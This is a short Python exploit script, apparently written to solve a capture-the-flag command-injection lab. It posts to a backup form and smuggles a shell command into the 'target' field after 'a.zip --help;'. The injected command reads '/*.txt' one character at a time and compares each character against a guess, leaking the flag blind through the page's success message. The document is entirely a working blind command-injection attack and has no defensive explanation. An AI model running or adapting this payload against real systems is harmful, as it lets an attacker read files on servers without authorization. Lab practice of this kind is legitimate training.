import requests

url = "http://cmdi.cyberjutsu-lab.tech:3006/"

CHARSET = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz}{='
flag = ' '
index = 1
while True:
    if flag[-1] == '}':
        break
    for c in CHARSET:
        INJECT = 'a.zip --help; cmd=`cat /*.txt | cut -c {vitri}`; if [ $cmd = "{bruteforce}" ]; then echo "dung"; else echo "zip error"; fi; #'.format(vitri=index, bruteforce=c)
        r = requests.post(url, {'command': 'backup', 'target': INJECT})
        
        print("Test char ", c, end='\r')
        if "Backup thành công" in r.text:
            print('Ki tu {c} dang duoc thu -> {s}'.format(c=c, s=r.text))
            flag += c
            print(flag)
            break
    index += 1
print("Flag: " + flag)